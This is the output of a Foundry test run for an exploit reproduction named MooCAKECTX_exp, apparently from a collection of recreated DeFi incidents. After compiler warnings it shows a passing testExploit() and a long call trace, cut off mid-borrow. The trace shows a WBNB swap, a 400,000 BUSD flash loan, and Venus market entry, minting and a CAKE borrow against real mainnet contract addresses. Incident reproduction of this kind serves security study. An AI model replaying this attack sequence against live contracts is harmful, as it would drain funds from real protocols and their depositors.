Compiling 25 files with Solc 0.8.10
Compiling 26 files with Solc 0.8.25
Solc 0.8.10 finished in 845.74ms
Solc 0.8.25 finished in 911.68ms
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2022-11/MooCAKECTX_exp.sol:45:5:
   |
45 |     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/test/interface.sol:2080:1:
     |
2080 | interface WBNB {
     | ^ (Relevant source part starts here and spans across multiple lines).

Warning (9302): Return value of low-level calls not used.
  --> src/test/2022-11/MooCAKECTX_exp.sol:65:9:
   |
65 |         address(WBNB).call{value: 3 ether}("");
   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Warning (2072): Unused local variable.
  --> src/test/2022-11/MooCAKECTX_exp.sol:85:9:
   |
85 |         Harvest harvest = new Harvest();
   |         ^^^^^^^^^^^^^^^


Ran 1 test for src/test/2022-11/MooCAKECTX_exp.sol:ContractTest
[PASS] testExploit() (gas: 1643427)
Logs:
  [End] Attacker CAKE balance after exploit: 29913.717660761050982637

Traces:
  [2028527] ContractTest::testExploit()
    тФЬтФА [23731] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::fallback{value: 3000000000000000000}()
    тФВ   тФЬтФА emit Deposit(dst: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], wad: 3000000000000000000 [3e18])
    тФВ   тФФтФА тЖР [Stop] 
    тФЬтФА [24420] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    тФВ   тФЬтФА emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    тФВ   тФФтФА тЖР [Return] true
    тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    тФВ   тФФтФА тЖР [Return] 3000000000000000000 [3e18]
    тФЬтФА [89614] 0x10ED43C718714eb63d5aA57B78B54704E256024E::swapExactTokensForTokensSupportingFeeOnTransferTokens(3000000000000000000 [3e18], 0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xA8c2B8eec3d368C0253ad3dae65a5F2BBB89c929], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1667770234 [1.667e9])
    тФВ   тФЬтФА [8225] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x460b4193Ec4C1a17372Aa5FDcd44c520ba658646, 3000000000000000000 [3e18])
    тФВ   тФВ   тФЬтФА emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x460b4193Ec4C1a17372Aa5FDcd44c520ba658646, value: 3000000000000000000 [3e18])
    тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФЬтФА [2585] 0xA8c2B8eec3d368C0253ad3dae65a5F2BBB89c929::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФЬтФА [2893] 0x460b4193Ec4C1a17372Aa5FDcd44c520ba658646::getReserves() [staticcall]
    тФВ   тФВ   тФФтФА тЖР [Return] 68596701079 [6.859e10], 174066044332683758722 [1.74e20], 1667767819 [1.667e9]
    тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x460b4193Ec4C1a17372Aa5FDcd44c520ba658646) [staticcall]
    тФВ   тФВ   тФФтФА тЖР [Return] 177066044332683758722 [1.77e20]
    тФВ   тФЬтФА [62600] 0x460b4193Ec4C1a17372Aa5FDcd44c520ba658646::swap(1159365839 [1.159e9], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    тФВ   тФВ   тФЬтФА [28169] 0xA8c2B8eec3d368C0253ad3dae65a5F2BBB89c929::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1159365839 [1.159e9])
    тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0x460b4193Ec4C1a17372Aa5FDcd44c520ba658646, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1159365839 [1.159e9])
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФЬтФА [585] 0xA8c2B8eec3d368C0253ad3dae65a5F2BBB89c929::balanceOf(0x460b4193Ec4C1a17372Aa5FDcd44c520ba658646) [staticcall]
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 67437335240 [6.743e10]
    тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x460b4193Ec4C1a17372Aa5FDcd44c520ba658646) [staticcall]
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 177066044332683758722 [1.77e20]
    тФВ   тФВ   тФЬтФА emit Sync(reserve0: 67437335240 [6.743e10], reserve1: 177066044332683758722 [1.77e20])
    тФВ   тФВ   тФЬтФА emit Swap(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0In: 0, amount1In: 3000000000000000000 [3e18], amount0Out: 1159365839 [1.159e9], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФЬтФА [585] 0xA8c2B8eec3d368C0253ad3dae65a5F2BBB89c929::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    тФВ   тФВ   тФФтФА тЖР [Return] 1159365839 [1.159e9]
    тФВ   тФФтФА тЖР [Stop] 
    тФЬтФА [585] 0xA8c2B8eec3d368C0253ad3dae65a5F2BBB89c929::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    тФВ   тФФтФА тЖР [Return] 1159365839 [1.159e9]
    тФЬтФА [8269] 0xA8c2B8eec3d368C0253ad3dae65a5F2BBB89c929::transfer(0xF35d63Df93f32e025bce4A1B98dcEC1fe07AD892, 1159365839 [1.159e9])
    тФВ   тФЬтФА emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xF35d63Df93f32e025bce4A1B98dcEC1fe07AD892, value: 1159365839 [1.159e9])
    тФВ   тФФтФА тЖР [Return] true
    тФЬтФА [1852840] 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4::flashLoan(0, 400000000000000000000000 [4e23], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00)
    тФВ   тФЬтФА [29971] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 400000000000000000000000 [4e23])
    тФВ   тФВ   тФЬтФА emit Transfer(from: 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 400000000000000000000000 [4e23])
    тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФЬтФА [1796443] ContractTest::DPPFlashLoanCall(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 400000000000000000000000 [4e23], 0x00)
    тФВ   тФВ   тФЬтФА [130395] 0xfD36E2c2a6789Db23113685031d7F16329158384::enterMarkets([0x95c78222B3D6e262426483D42CfA53685A67Ab9D, 0x86aC3974e2BD0d60825230fa6F355fF11409df5c])
    тФВ   тФВ   тФВ   тФЬтФА [125179] 0xAe8Ba50ee0a0E55EC21bf4ffE2c48d2FdF52D3e6::enterMarkets([0x95c78222B3D6e262426483D42CfA53685A67Ab9D, 0x86aC3974e2BD0d60825230fa6F355fF11409df5c]) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit MarketEntered(rToken: 0x95c78222B3D6e262426483D42CfA53685A67Ab9D, account: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit MarketEntered(rToken: 0x86aC3974e2BD0d60825230fa6F355fF11409df5c, account: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФЬтФА [24562] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::approve(0x95c78222B3D6e262426483D42CfA53685A67Ab9D, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    тФВ   тФВ   тФВ   тФЬтФА emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x95c78222B3D6e262426483D42CfA53685A67Ab9D, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФЬтФА [531] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 400000000000000000000000 [4e23]
    тФВ   тФВ   тФЬтФА [182549] 0x95c78222B3D6e262426483D42CfA53685A67Ab9D::mint(400000000000000000000000 [4e23])
    тФВ   тФВ   тФВ   тФЬтФА [177289] 0x13f816511384D3534783241ddb5751c4b7a7e148::mint(400000000000000000000000 [4e23]) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [2531] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::balanceOf(0x95c78222B3D6e262426483D42CfA53685A67Ab9D) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 111163712666643952909666939 [1.111e26]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [8246] 0x9E47C4F8654EDFb45bc81E7E320c8fC1AD0aCB73::getBorrowRate(111163712666643952909666939 [1.111e26], 123453978879980361587412040 [1.234e26], 49097020325972190036664 [4.909e22]) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000000000000000000000000000000000009535f0c1
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit AccrueInterest(cashPrior: 111163712666643952909666939 [1.111e26], interestAccumulated: 89005625644767922475 [8.9e19], borrowIndex: 1125487099896675398 [1.125e18], totalBorrows: 123454067885606006355334515 [1.234e26])
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [77962] 0xfD36E2c2a6789Db23113685031d7F16329158384::mintAllowed(0x95c78222B3D6e262426483D42CfA53685A67Ab9D, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 400000000000000000000000 [4e23])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [77282] 0xAe8Ba50ee0a0E55EC21bf4ffE2c48d2FdF52D3e6::mintAllowed(0x95c78222B3D6e262426483D42CfA53685A67Ab9D, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 400000000000000000000000 [4e23]) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2344] 0x95c78222B3D6e262426483D42CfA53685A67Ab9D::totalSupply() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 1080353411122250911 [1.08e18]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [5821] 0x95c78222B3D6e262426483D42CfA53685A67Ab9D::exchangeRateStored() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4511] 0x95c78222B3D6e262426483D42CfA53685A67Ab9D::delegateToImplementation(0x182df0f5) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2942] 0x13f816511384D3534783241ddb5751c4b7a7e148::exchangeRateStored() [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [531] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::balanceOf(0x95c78222B3D6e262426483D42CfA53685A67Ab9D) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 111163712666643952909666939 [1.111e26]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 217122167817007095823617059 [2.171e26]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000000000000000000000b399684d564c8bc1064c23
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 217122167817007095823617059 [2.171e26]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [344] 0x95c78222B3D6e262426483D42CfA53685A67Ab9D::totalSupply() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 1080353411122250911 [1.08e18]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2561] 0xcF6BB5389c92Bdda8a3747Ddb454cB7a64626C63::balanceOf(0xfD36E2c2a6789Db23113685031d7F16329158384) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 15396713908246186889020790 [1.539e25]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [5581] 0x95c78222B3D6e262426483D42CfA53685A67Ab9D::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4145] 0x95c78222B3D6e262426483D42CfA53685A67Ab9D::delegateToImplementation(0x70a082310000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2488] 0x13f816511384D3534783241ddb5751c4b7a7e148::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit DistributedSupplierVenus(param0: 0x95c78222B3D6e262426483D42CfA53685A67Ab9D, param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 0, param3: 1411194283732082232551454911018101020363731 [1.411e42])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [531] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::balanceOf(0x95c78222B3D6e262426483D42CfA53685A67Ab9D) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 111163712666643952909666939 [1.111e26]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [531] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::balanceOf(0x95c78222B3D6e262426483D42CfA53685A67Ab9D) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 111163712666643952909666939 [1.111e26]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [8834] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x95c78222B3D6e262426483D42CfA53685A67Ab9D, 400000000000000000000000 [4e23])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x95c78222B3D6e262426483D42CfA53685A67Ab9D, value: 400000000000000000000000 [4e23])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x95c78222B3D6e262426483D42CfA53685A67Ab9D, value: 115792089237316195423570985008687907853269984665640563639457584007913129639935 [1.157e77])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [531] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::balanceOf(0x95c78222B3D6e262426483D42CfA53685A67Ab9D) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 111563712666643952909666939 [1.115e26]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Mint(minter: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], mintAmount: 400000000000000000000000 [4e23], mintTokens: 1842280795285372 [1.842e15])
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0x95c78222B3D6e262426483D42CfA53685A67Ab9D, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1842280795285372 [1.842e15])
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [994] 0xfD36E2c2a6789Db23113685031d7F16329158384::mintVerify(0x95c78222B3D6e262426483D42CfA53685A67Ab9D, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 400000000000000000000000 [4e23], 1842280795285372 [1.842e15])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [381] 0xAe8Ba50ee0a0E55EC21bf4ffE2c48d2FdF52D3e6::mintVerify(0x95c78222B3D6e262426483D42CfA53685A67Ab9D, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 400000000000000000000000 [4e23], 1842280795285372 [1.842e15]) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФЬтФА [346860] 0x86aC3974e2BD0d60825230fa6F355fF11409df5c::borrow(50000000000000000000000 [5e22])
    тФВ   тФВ   тФВ   тФЬтФА [343479] 0x13f816511384D3534783241ddb5751c4b7a7e148::borrow(50000000000000000000000 [5e22]) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [2531] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::balanceOf(0x86aC3974e2BD0d60825230fa6F355fF11409df5c) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3450596464865196778065127 [3.45e24]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [7974] 0xC6F3f4D5421E70CB6C32C7402E51C8894A40F29a::getBorrowRate(3450596464865196778065127 [3.45e24], 2156253006542996644243131 [2.156e24], 9078353930066196000476 [9.078e21]) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000000000001b905f001
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit AccrueInterest(cashPrior: 3450596464865196778065127 [3.45e24], interestAccumulated: 4275784785118107437 [4.275e18], borrowIndex: 1619704391197731712 [1.619e18], totalBorrows: 2156257282327781762350568 [2.156e24])
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [209946] 0xfD36E2c2a6789Db23113685031d7F16329158384::borrowAllowed(0x86aC3974e2BD0d60825230fa6F355fF11409df5c, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 50000000000000000000000 [5e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [209266] 0xAe8Ba50ee0a0E55EC21bf4ffE2c48d2FdF52D3e6::borrowAllowed(0x86aC3974e2BD0d60825230fa6F355fF11409df5c, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 50000000000000000000000 [5e22]) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [39086] 0xd8B6dA2bfEC71D684D3E2a2FC9492dDad5C3787F::getUnderlyingPrice(0x86aC3974e2BD0d60825230fa6F355fF11409df5c) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3144] 0x86aC3974e2BD0d60825230fa6F355fF11409df5c::symbol() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] "vCAKE"
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [383] 0x86aC3974e2BD0d60825230fa6F355fF11409df5c::underlying() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3081] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::symbol() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] "Cake"
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [5640] 0xB6064eD41d4f67e353768aA239cA86f4F73665a1::decimals() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [298] 0x7935a51aDDaB8550D346FEEf34e02F67C9330109::decimals() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 8
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 8
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [10137] 0xB6064eD41d4f67e353768aA239cA86f4F73665a1::latestAnswer() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [7141] 0x7935a51aDDaB8550D346FEEf34e02F67C9330109::latestAnswer() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 494159292 [4.941e8]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 494159292 [4.941e8]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2403] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::decimals() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 18
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 4941592920000000000 [4.941e18]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [388] 0x86aC3974e2BD0d60825230fa6F355fF11409df5c::totalBorrows() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 2156257282327781762350568 [2.156e24]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [115594] 0x370053C7fA8C85C994d9d7b8732fEDF2b9B06447::getHypotheticalAccountLiquidity(0xfD36E2c2a6789Db23113685031d7F16329158384, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x86aC3974e2BD0d60825230fa6F355fF11409df5c, 0, 50000000000000000000000 [5e22]) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2100] 0xfD36E2c2a6789Db23113685031d7F16329158384::getAssetsIn(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1393] 0xAe8Ba50ee0a0E55EC21bf4ffE2c48d2FdF52D3e6::getAssetsIn(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] [0x95c78222B3D6e262426483D42CfA53685A67Ab9D, 0x86aC3974e2BD0d60825230fa6F355fF11409df5c]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] [0x95c78222B3D6e262426483D42CfA53685A67Ab9D, 0x86aC3974e2BD0d60825230fa6F355fF11409df5c]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [9096] 0x95c78222B3D6e262426483D42CfA53685A67Ab9D::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [7571] 0x95c78222B3D6e262426483D42CfA53685A67Ab9D::delegateToImplementation(0xc37f68e20000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [5686] 0x13f816511384D3534783241ddb5751c4b7a7e148::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [531] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::balanceOf(0x95c78222B3D6e262426483D42CfA53685A67Ab9D) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 111563712666643952909666939 [1.115e26]
